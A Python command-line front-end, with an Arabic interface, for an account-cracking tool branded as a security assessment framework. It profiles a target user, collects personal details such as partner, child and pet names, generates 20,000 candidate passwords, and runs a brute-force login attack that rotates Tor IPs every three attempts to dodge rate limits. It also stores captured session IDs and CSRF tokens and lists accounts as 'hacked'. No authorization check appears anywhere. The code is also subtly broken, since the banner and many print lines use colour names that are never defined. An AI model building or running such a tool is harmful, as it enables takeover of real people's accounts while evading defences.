#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║     ██████╗ █████╗ ███╗   ███╗ ██████╗ ██████╗  ██████╗   ║
║    ██╔════╝██╔══██╗████╗ ████║██╔═══██╗██╔══██╗██╔═══██╗  ║
║    ██║     ███████║██╔████╔██║██║   ██║██████╔╝██║   ██║  ║
║    ██║     ██╔══██║██║╚██╔╝██║██║   ██║██╔══██╗██║   ██║  ║
║    ╚██████╗██║  ██║██║ ╚═╝ ██║╚██████╔╝██║  ██║╚██████╔╝  ║
║     ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ║
║                                                            ║
║   🔮 AI-Powered Security Assessment Framework v5.0        ║
║   🧠 Human-like Intelligence | 🔄 IP Rotation | ⚡ Turbo  ║
╚══════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import time
import random
import signal
import argparse
from pathlib import Path
from datetime import datetime

# === إعداد المسارات ===
BASE_DIR = Path(__file__).parent.resolve()
MODULES_DIR = BASE_DIR / 'modules'
RESULTS_DIR = BASE_DIR / 'results'
RESULTS_DIR.mkdir(exist_ok=True)

sys.path.insert(0, str(BASE_DIR))

from modules.info_gather import InfoGatherer
from modules.password_gen import PasswordGenerator
from modules.brute_force import BruteForceEngine
from modules.proxy_manager import ProxyManager
from modules.session_manager import SessionManager

# === الألوان ===
class Colors:
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    PURPLE = '\033[0;35m'
    CYAN = '\033[0;36m'
    WHITE = '\033[1;37m'
    BOLD = '\033[1m'
    NC = '\033[0m'

C = Colors()

BANNER = f"""
{PURPLE}╔══════════════════════════════════════════════════════════════╗
║                                                              ║
{CYAN}     ██████╗ █████╗ ███╗   ███╗ ██████╗ ██████╗  ██████╗ 
    ██╔════╝██╔══██╗████╗ ████║██╔═══██╗██╔══██╗██╔═══██╗
    ██║     ███████║██╔████╔██║██║   ██║██████╔╝██║   ██║
    ██║     ██╔══██║██║╚██╔╝██║██║   ██║██╔══██╗██║   ██║
    ╚██████╗██║  ██║██║ ╚═╝ ██║╚██████╔╝██║  ██║╚██████╔╝
     ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ 
{PURPLE}║                                                              ║
║   {WHITE}🔮 AI-Powered Security Assessment Framework v5.0{PURPLE}           ║
║   {YELLOW}🧠 Human-like Intelligence | 🔄 IP Rotation | ⚡ Turbo{PURPLE}     ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝{NC}
"""

def clear_screen():
    os.system('clear' if os.name != 'nt' else 'cls')

def print_banner():
    clear_screen()
    print(BANNER)

def show_menu():
    """القائمة الرئيسية"""
    print_banner()
    print(f"\n  {C.CYAN}[1]{C.WHITE} 🔍  Intelligence Gathering    - جمع المعلومات الاستخباراتية")
    print(f"  {C.CYAN}[2]{C.WHITE} 🧠  AI Password Generation    - توليد كلمات المرور بالذكاء الاصطناعي")
    print(f"  {C.CYAN}[3]{C.WHITE} ⚡  Brute Force Attack         - هجوم تخمين كلمة المرور")
    print(f"  {C.CYAN}[4]{C.WHITE} 🔄  Full Auto Mode             - الوضع التلقائي الكامل")
    print(f"  {C.CYAN}[5]{C.WHITE} 📊  Show Results               - عرض النتائج")
    print(f"  {C.CYAN}[6]{C.WHITE} 🛡️  Proxy/Tor Manager          - إدارة البروكسي وتغيير IP")
    print(f"  {C.CYAN}[7]{C.WHITE} 🔑  Session Manager            - إدارة الجلسات")
    print(f"  {C.CYAN}[0]{C.WHITE} 🚪  Exit                        - خروج")
    print(f"\n  {PURPLE}{'─' * 60}{NC}")
    choice = input(f"  {C.YELLOW}[?]{C.WHITE} اختر: {C.NC}").strip()
    return choice

def mode_intel():
    """الوضع 1: جمع المعلومات"""
    print_banner()
    print(f"\n{C.CYAN}╔{'═' * 55}╗{NC}")
    print(f"{C.CYAN}║{' ' * 12}🔍 INTELLIGENCE GATHERING{' ' * 16}║{NC}")
    print(f"{C.CYAN}╚{'═' * 55}╝{NC}\n")

    username = input(f"  {C.YELLOW}[?]{C.WHITE} اسم المستخدم المستهدف: {C.NC}").strip()
    if not username:
        print(f"{C.RED}[!] اسم المستخدم مطلوب{NC}")
        return

    gatherer = InfoGatherer(username)
    info = gatherer.gather()

    if info and info.get('exists'):
        gatherer.save()
        gatherer.display()

        # جمع معلومات إضافية من المستخدم
        print(f"\n{C.YELLOW}╔{'═' * 55}╗{NC}")
        print(f"{C.YELLOW}║{' ' * 8}📝 معلومات إضافية (لتعزيز التخمين){' ' * 10}║{NC}")
        print(f"{C.YELLOW}╚{'═' * 55}╝{NC}")

        extra_fields = {
            'real_name': '👤 الاسم الحقيقي',
            'birthdate': '🎂 تاريخ الميلاد (YYYY-MM-DD)',
            'partner_name': '💑 اسم الشريك',
            'child_name': '👶 اسم الطفل',
            'pet_name': '🐾 اسم الحيوان الأليف',
            'hobby': '🎯 الهواية',
            'city': '🏙️ المدينة',
            'fav_number': '🔢 الرقم المفضل',
            'fav_color': '🎨 اللون المفضل',
            'fav_team': '⚽ الفريق الرياضي المفضل',
            'fav_artist': '🎵 الفنان/المغني المفضل',
            'fav_food': '🍕 الأكل المفضل',
            'phone_number': '📱 رقم الهاتف',
            'keyword': '🔑 كلمة مفتاحية',
        }

        extra = {}
        for key, label in extra_fields.items():
            val = input(f"  {C.YELLOW}{label}: {C.NC}").strip()
            if val:
                extra[key] = val

        if extra:
            info.update(extra)
            gatherer.info = info
            gatherer.save()
            print(f"{C.GREEN}[✓] تم حفظ المعلومات الإضافية{NC}")

    else:
        print(f"\n{C.RED}[!] فشل جلب معلومات الحساب{NC}")

    input(f"\n{C.YELLOW}[*] اضغط Enter للعودة...{NC}")

def mode_generate():
    """الوضع 2: توليد كلمات المرور"""
    print_banner()
    print(f"\n{C.CYAN}╔{'═' * 55}╗{NC}")
    print(f"{C.CYAN}║{' ' * 10}🧠 AI PASSWORD GENERATION{' ' * 15}║{NC}")
    print(f"{C.CYAN}╚{'═' * 55}╝{NC}\n")

    username = input(f"  {C.YELLOW}[?]{C.WHITE} اسم المستخدم: {C.NC}").strip()
    if not username:
        print(f"{C.RED}[!] اسم المستخدم مطلوب{NC}")
        return

    # تحميل المعلومات المجمعة
    info_path = RESULTS_DIR / username / 'info.json'
    if not info_path.exists():
        print(f"{C.RED}[!] لا توجد معلومات مجمعة. استخدم الخيار 1 أولاً.{NC}")
        input(f"{C.YELLOW}[*] اضغط Enter للعودة...{NC}")
        return

    with open(info_path, 'r', encoding='utf-8') as f:
        info = json.load(f)

    gen = PasswordGenerator(username, info)
    passwords = gen.generate(target_count=20000)
    filepath = gen.save(passwords)

    print(f"\n{C.GREEN}╔{'═' * 55}╗{NC}")
    print(f"{C.GREEN}║{' ' * 12}✅ تم توليد {len(passwords):,} كلمة مرور{' ' * 14}║{NC}")
    print(f"{C.GREEN}║{' ' * 12}   المحفوظة في: {filepath}{' ' * 10}║{NC}")
    print(f"{C.GREEN}╚{'═' * 55}╝{NC}")

    print(f"\n{C.CYAN}[*] عينة من كلمات المرور المولدة:{NC}")
    for pwd in passwords[:20]:
        print(f"  {C.RED}•{C.NC} {pwd}")

    input(f"\n{C.YELLOW}[*] اضغط Enter للعودة...{NC}")

def mode_attack():
    """الوضع 3: هجوم القوة العمياء"""
    print_banner()
    print(f"\n{C.CYAN}╔{'═' * 55}╗{NC}")
    print(f"{C.CYAN}║{' ' * 14}⚡ BRUTE FORCE ATTACK{' ' * 16}║{NC}")
    print(f"{C.CYAN}╚{'═' * 55}╝{NC}\n")

    username = input(f"  {C.YELLOW}[?]{C.WHITE} اسم المستخدم: {C.NC}").strip()
    if not username:
        print(f"{C.RED}[!] اسم المستخدم مطلوب{NC}")
        return

    pwd_path = RESULTS_DIR / username / 'passwords.txt'
    if not pwd_path.exists():
        print(f"{C.RED}[!] لا توجد كلمات مرور مولدة. استخدم الخيار 2 أولاً.{NC}")
        input(f"{C.YELLOW}[*] اضغط Enter للعودة...{NC}")
        return

    with open(pwd_path, 'r') as f:
        total = sum(1 for _ in f)

    print(f"\n{C.CYAN}[*] تحميل كلمات المرور...{NC}")
    print(f"  {C.WHITE}العدد الإجمالي:{C.NC} {total:,} كلمة مرور")
    print(f"  {C.WHITE}تغيير IP:{C.NC} كل 3 محاولات")
    print(f"  {C.WHITE}الـ Threads:{C.NC} 5 (متزامنة)")

    # خيارات متقدمة
    print(f"\n{C.YELLOW}[*] خيارات متقدمة:{NC}")
    threads = input(f"  {C.WHITE}عدد الثريدات (افتراضي 5):{C.NC} ").strip()
    threads = int(threads) if threads.isdigit() else 5

    rotate_every = input(f"  {C.WHITE}تغيير IP كل كم محاولة (افتراضي 3):{C.NC} ").strip()
    rotate_every = int(rotate_every) if rotate_every.isdigit() else 3

    delay = input(f"  {C.WHITE}تأخير بين المحاولات بالثواني (افتراضي 2-5):{C.NC} ").strip()
    delay = float(delay) if delay.replace('.','').isdigit() else None

    print(f"\n{C.RED}⚠️  تحذير: الهجوم سيبدأ فوراً{NC}")
    confirm = input(f"  {C.YELLOW}[?]{C.WHITE} اكتب 'YES' للتأكيد: {C.NC}").strip()
    if confirm != 'YES':
        print(f"{C.YELLOW}[*] تم الإلغاء{NC}")
        return

    # بدء الهجوم
    proxy_mgr = ProxyManager()
    engine = BruteForceEngine(
        username=username,
        proxy_manager=proxy_mgr,
        threads=threads,
        rotate_every=rotate_every,
        delay_range=(delay, delay * 2.5) if delay else (2, 5)
    )
    success = engine.run()

    if success:
        print(f"\n{C.GREEN}╔{'═' * 55}╗{NC}")
        print(f"{C.GREEN}║{' ' * 15}🎉 SUCCESS! PASSWORD FOUND{' ' * 13}║{NC}")
        print(f"{C.GREEN}╚{'═' * 55}╝{NC}")
    else:
        print(f"\n{C.YELLOW}[*] انتهى الهجوم دون العثور على كلمة المرور{NC}")

    input(f"\n{C.YELLOW}[*] اضغط Enter للعودة...{NC}")

def mode_full_auto():
    """الوضع 4: تلقائي كامل"""
    print_banner()
    print(f"\n{C.CYAN}╔{'═' * 55}╗{NC}")
    print(f"{C.CYAN}║{' ' * 13}🔄 FULL AUTO MODE{' ' * 18}║{NC}")
    print(f"{C.CYAN}║{' ' * 7}جمع → توليد → هجوم - تلقائياً{' ' * 8}║{NC}")
    print(f"{C.CYAN}╚{'═' * 55}╝{NC}\n")

    username = input(f"  {C.YELLOW}[?]{C.WHITE} اسم المستخدم: {C.NC}").strip()
    if not username:
        print(f"{C.RED}[!] اسم المستخدم مطلوب{NC}")
        return

    # === المرحلة 1: جمع المعلومات ===
    print(f"\n{C.PURPLE}{'─' * 55}{NC}")
    print(f"{C.CYAN}[1/3] 🔍 جمع المعلومات الاستخباراتية...{NC}")
    print(f"{C.PURPLE}{'─' * 55}{NC}")

    gatherer = InfoGatherer(username)
    info = gatherer.gather()

    if not info or not info.get('exists'):
        print(f"{C.RED}[!] فشل جمع المعلومات. الخروج.{NC}")
        return

    gatherer.save()
    gatherer.display()

    # معلومات إضافية
    print(f"\n{C.YELLOW}[*] معلومات إضافية لتعزيز التخمين (اختياري):{NC}")
    extra = {}
    fields = [
        ('real_name', 'الاسم الحقيقي'),
        ('birthdate', 'تاريخ الميلاد YYYY-MM-DD'),
        ('city', 'المدينة'),
        ('partner_name', 'اسم الشريك'),
        ('pet_name', 'اسم الحيوان'),
        ('keyword', 'كلمة مفتاحية'),
    ]
    for key, label in fields:
        val = input(f"  {C.YELLOW}{label}: {C.NC}").strip()
        if val:
            extra[key] = val

    if extra:
        info.update(extra)
        gatherer.info = info
        gatherer.save()

    # === المرحلة 2: توليد كلمات المرور ===
    print(f"\n{C.PURPLE}{'─' * 55}{NC}")
    print(f"{C.CYAN}[2/3] 🧠 توليد 20,000 كلمة مرور بالذكاء الاصطناعي...{NC}")
    print(f"{C.PURPLE}{'─' * 55}{NC}")

    gen = PasswordGenerator(username, info)
    passwords = gen.generate(target_count=20000)
    gen.save(passwords)

    print(f"{C.GREEN}[✓] تم توليد {len(passwords):,} كلمة مرور{NC}")
    print(f"\n{C.CYAN}[*] عينة:{NC}")
    for pwd in passwords[:10]:
        print(f"  {C.RED}•{C.NC} {pwd}")

    # === المرحلة 3: الهجوم ===
    print(f"\n{C.PURPLE}{'─' * 55}{NC}")
    print(f"{C.CYAN}[3/3] ⚡ بدء هجوم تخمين كلمة المرور...{NC}")
    print(f"{C.PURPLE}{'─' * 55}{NC}")

    print(f"\n{C.RED}⚠️  هذا سيبدأ الهجوم فوراً{NC}")
    confirm = input(f"  {C.YELLOW}[?]{C.WHITE} اكتب 'YES' للمتابعة: {C.NC}").strip()
    if confirm != 'YES':
        print(f"{C.YELLOW}[*] تم الإلغاء. النتائج محفوظة.{NC}")
        return

    proxy_mgr = ProxyManager()
    engine = BruteForceEngine(
        username=username,
        proxy_manager=proxy_mgr,
        threads=5,
        rotate_every=3,
        delay_range=(2, 5)
    )
    success = engine.run()

    if success:
        print(f"\n{C.GREEN}╔{'═' * 55}╗{NC}")
        print(f"{C.GREEN}║{' ' * 15}🎉 تم العثور على كلمة المرور!{' ' * 12}║{NC}")
        print(f"{C.GREEN}╚{'═' * 55}╝{NC}")
    else:
        print(f"\n{C.YELLOW}[*] لم يتم العثور على كلمة المرور في هذه المجموعة{NC}")

    input(f"\n{C.YELLOW}[*] اضغط Enter للعودة...{NC}")

def mode_results():
    """الوضع 5: عرض النتائج"""
    print_banner()
    print(f"\n{C.CYAN}╔{'═' * 55}╗{NC}")
    print(f"{C.CYAN}║{' ' * 15}📊 SHOW RESULTS{' ' * 19}║{NC}")
    print(f"{C.CYAN}╚{'═' * 55}╝{NC}\n")

    # عرض كل المجلدات
    if not RESULTS_DIR.exists():
        print(f"{C.RED}[!] لا توجد نتائج{NC}")
        input(f"\n{C.YELLOW}[*] اضغط Enter للعودة...{NC}")
        return

    dirs = [d for d in RESULTS_DIR.iterdir() if d.is_dir()]
    if not dirs:
        print(f"{C.RED}[!] لا توجد نتائج{NC}")
        input(f"\n{C.YELLOW}[*] اضغط Enter للعودة...{NC}")
        return

    for i, d in enumerate(dirs, 1):
        info_path = d / 'info.json'
        pwd_path = d / 'passwords.txt'
        success_path = d / 'success.txt'

        info_size = info_path.stat().st_size if info_path.exists() else 0
        pwd_count = sum(1 for _ in open(pwd_path)) if pwd_path.exists() else 0
        has_success = success_path.exists()

        status = f"{C.GREEN}✅ تم الاختراق{NC}" if has_success else f"{C.YELLOW}⏳ قيد التقدم{NC}"
        print(f"  {C.CYAN}[{i}]{C.NC} {C.WHITE}{d.name}{C.NC} | {status}")
        print(f"       كلمات مرور: {pwd_count:,} | معلومات: {'موجودة' if info_size else 'لا'}")
        print()

    username = input(f"  {C.YELLOW}[?]{C.WHITE} اسم المستخدم للتفاصيل: {C.NC}").strip()
    if not username:
        return

    user_dir = RESULTS_DIR / username
    if not user_dir.exists():
        print(f"{C.RED}[!] لا توجد نتائج لهذا الحساب{NC}")
        return

    # عرض النجاح إذا وجد
    success_path = user_dir / 'success.txt'
    if success_path.exists():
        with open(success_path, 'r') as f:
            data = json.load(f)
        print(f"\n{C.GREEN}╔{'═' * 55}╗{NC}")
        print(f"{C.GREEN}║{' ' * 15}✅ تم العثور على كلمة المرور!{' ' * 12}║{NC}")
        print(f"{C.GREEN}╚{'═' * 55}╝{NC}")
        print(f"  {C.WHITE}كلمة المرور:{C.NC} {C.GREEN}{data.get('password', '???')}{C.NC}")
        print(f"  {C.WHITE}عدد المحاولات:{C.NC} {data.get('attempts', '?')}")
        print(f"  {C.WHITE}الوقت المستغرق:{C.NC} {data.get('elapsed', '?')}")
    else:
        # عرض إحصائيات
        tested_path = user_dir / 'tested.txt'
        pwd_path = user_dir / 'passwords.txt'
        tested = sum(1 for _ in open(tested_path)) if tested_path.exists() else 0
        total = sum(1 for _ in open(pwd_path)) if pwd_path.exists() else 0
        print(f"\n{C.YELLOW}[*] الإحصائيات:{NC}")
        print(f"  {C.WHITE}المختبر:{C.NC} {tested:,} / {total:,}")
        print(f"  {C.WHITE}النسبة:{C.NC} {(tested/total*100):.1f}%" if total else "  لا توجد بيانات")

    input(f"\n{C.YELLOW}[*] اضغط Enter للعودة...{NC}")

def mode_proxy():
    """الوضع 6: إدارة البروكسي"""
    print_banner()
    print(f"\n{C.CYAN}╔{'═' * 55}╗{NC}")
    print(f"{C.CYAN}║{' ' * 13}🛡️ PROXY/TOR MANAGER{' ' * 16}║{NC}")
    print(f"{C.CYAN}╚{'═' * 55}╝{NC}\n")

    pm = ProxyManager()

    print(f"  {C.CYAN}[1]{C.WHITE} عرض حالة Tor/Proxy")
    print(f"  {C.CYAN}[2]{C.WHITE} تغيير IP يدوياً")
    print(f"  {C.CYAN}[3]{C.WHITE} اختبار الاتصال")
    print(f"  {C.CYAN}[4]{C.WHITE} عرض IP الحالي")

    choice = input(f"  {C.YELLOW}[?]{C.WHITE} اختر: {C.NC}").strip()

    if choice == '1':
        tor_ok = pm.check_tor()
        print(f"  Tor: {C.GREEN}✅ شغال{NC}" if tor_ok else f"  Tor: {C.RED}❌ متوقف{NC}")
        print(f"  IP الحالي: {C.CYAN}{pm.current_ip or 'غير معروف'}{NC}")
        print(f"  عدد التغييرات: {pm.total_rotations}")

    elif choice == '2':
        print(f"\n{C.CYAN}[*] جاري تغيير IP...{NC}")
        new_ip = pm.rotate_ip()
        if new_ip:
            print(f"{C.GREEN}[✓] IP جديد: {C.WHITE}{new_ip}{NC}")
        else:
            print(f"{C.RED}[!] فشل تغيير IP{NC}")

    elif choice == '3':
        result = pm.test_connection()
        if result:
            print(f"{C.GREEN}[✓] اتصال ناجح{NC}")
            print(f"  IP: {result.get('ip', '?')}")
            print(f"  Country: {result.get('country', '?')}")
        else:
            print(f"{C.RED}[!] فشل الاتصال{NC}")

    elif choice == '4':
        ip = pm.get_current_ip()
        print(f"  IP الحالي: {C.CYAN}{ip or 'غير معروف'}{NC}")

    input(f"\n{C.YELLOW}[*] اضغط Enter للعودة...{NC}")

def mode_session():
    """الوضع 7: إدارة الجلسات"""
    print_banner()
    print(f"\n{C.CYAN}╔{'═' * 55}╗{NC}")
    print(f"{C.CYAN}║{' ' * 14}🔑 SESSION MANAGER{' ' * 17}║{NC}")
    print(f"{C.CYAN}╚{'═' * 55}╝{NC}\n")

    sm = SessionManager()

    print(f"  {C.CYAN}[1]{C.WHITE} حفظ جلسة جديدة")
    print(f"  {C.CYAN}[2]{C.WHITE} تحميل جلسة محفوظة")
    print(f"  {C.CYAN}[3]{C.WHITE} عرض الجلسات المحفوظة")
    print(f"  {C.CYAN}[4]{C.WHITE} حذف جلسة")

    choice = input(f"  {C.YELLOW}[?]{C.WHITE} اختر: {C.NC}").strip()

    if choice == '1':
        username = input(f"  {C.YELLOW}Username:{C.NC} ").strip()
        session_id = input(f"  {C.YELLOW}Session ID:{C.NC} ").strip()
        csrf = input(f"  {C.YELLOW}CSRF Token:{C.NC} ").strip()
        if username and session_id:
            sm.save(username, session_id, csrf)
            print(f"{C.GREEN}[✓] تم حفظ الجلسة{NC}")

    elif choice == '2':
        username = input(f"  {C.YELLOW}Username:{C.NC} ").strip()
        session = sm.load(username)
        if session:
            print(f"{C.GREEN}[✓] تم تحميل الجلسة{NC}")
            print(f"  Session ID: {session.get('session_id', '?')[:20]}...")
        else:
            print(f"{C.RED}[!] لا توجد جلسة محفوظة{NC}")

    elif choice == '3':
        sessions = sm.list_all()
        if sessions:
            for s in sessions:
                print(f"  {C.CYAN}•{C.NC} {s['username']} | {s['created_at']}")
        else:
            print(f"{C.YELLOW}[*] لا توجد جلسات{NC}")

    elif choice == '4':
        username = input(f"  {C.YELLOW}Username للحذف:{C.NC} ").strip()
        if sm.delete(username):
            print(f"{C.GREEN}[✓] تم الحذف{NC}")

    input(f"\n{C.YELLOW}[*] اضغط Enter للعودة...{NC}")

def signal_handler(sig, frame):
    print(f"\n\n{C.YELLOW}[!] تم إيقاف الأداة بواسطة Ctrl+C{NC}")
    sys.exit(0)

def main():
    signal.signal(signal.SIGINT, signal_handler)

    while True:
        try:
            choice = show_menu()

            if choice == '1':
                mode_intel()
            elif choice == '2':
                mode_generate()
            elif choice == '3':
                mode_attack()
            elif choice == '4':
                mode_full_auto()
            elif choice == '5':
                mode_results()
            elif choice == '6':
                mode_proxy()
            elif choice == '7':
                mode_session()
            elif choice == '0':
                print_banner()
                print(f"\n{C.GREEN}  👋 مع السلامة!\n{NC}")
                sys.exit(0)
            else:
                print(f"{C.RED}[!] خيار غير صحيح{NC}")
                time.sleep(1)

        except KeyboardInterrupt:
            print(f"\n\n{C.YELLOW}[!] تم إيقاف الأداة{NC}")
            sys.exit(0)
        except Exception as e:
            print(f"\n{C.RED}[!] خطأ: {e}{NC}")
            time.sleep(2)

if __name__ == '__main__':
    main()
